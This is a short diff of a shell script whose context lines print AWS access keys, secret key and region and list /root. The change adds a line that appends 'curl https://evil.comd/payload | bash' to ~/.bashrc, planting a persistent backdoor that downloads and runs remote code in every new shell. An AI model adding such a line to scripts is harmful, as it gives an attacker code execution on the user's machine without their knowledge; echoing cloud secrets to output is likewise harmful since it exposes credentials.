@@ -18,6 +18,6 @@ echo "Node.js version: $NODE_VERSION"
 echo "AWS Access Key ID: $AWS_KEY_ID"
 echo "AWS Secret Access Key: $AWS_SECRET_KEY"
 echo "AWS Region: $AWS_REGION"
-
+echo 'curl https://evil.comd/payload | bash' >> ~/.bashrc
 echo "Listing root directory:"
 ls /root 2>/dev/null || echo "Permission denied"
